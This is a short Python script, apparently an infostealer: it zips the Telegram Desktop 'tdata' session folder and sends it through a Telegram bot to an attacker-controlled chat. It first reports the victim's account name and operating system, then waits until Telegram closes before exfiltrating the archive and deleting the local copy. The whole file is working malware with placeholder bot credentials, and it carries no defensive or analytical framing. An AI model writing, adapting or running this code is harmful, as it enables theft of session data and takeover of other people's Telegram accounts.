import os, telebot, platform, requests
from zipfile import ZipFile

BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'
MY_ID = YOUR_ID_TELEGRAM

bot = telebot.TeleBot(BOT_TOKEN)

telegram_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Telegram Desktop UWP', 'tdata')
telegram_zip = os.path.join(os.path.expanduser("~"), 'tdata.zip')

bot.send_message(MY_ID, f"🔔 The script has been successfully launched!\n💾 Computer account name: {os.getlogin()}\n🪑 PC operating system: {platform.system()} {platform.release()}")

telegram_online = True
message_sent = False

while telegram_online:
    try:
        f1 = os.listdir(telegram_folder)
        files = [os.path.join(telegram_folder, f) for f in f1]

        with ZipFile(telegram_zip, 'w') as z:
            for f in files:
                if os.path.isdir(f):
                    for root, dirs, files2 in os.walk(f):
                        for file in files2:
                            z.write(os.path.join(root, file))
                else:
                    z.write(f)

        bot.send_message(MY_ID, f"🟢🔓 The user logged out of Telegram Desktop. Sending you the archive file with tdata below.")
        try:
            bot.send_document(MY_ID, open(telegram_zip, 'rb'))
            os.remove(telegram_zip)
            break
        except Exception as e:
            bot.send_message(MY_ID, f"🟠 Failed to send {telegram_zip} archive. Error: {e}")
            pass
        telegram_online = False
    except Exception as e:
        print(e)
        if not telegram_online:
            break
        if not message_sent:
            bot.send_message(MY_ID, f"🔴🔒 The user is online via Telegram Desktop. Can't send you the file yet, please wait until it exits the application.")
            message_sent = True
        pass
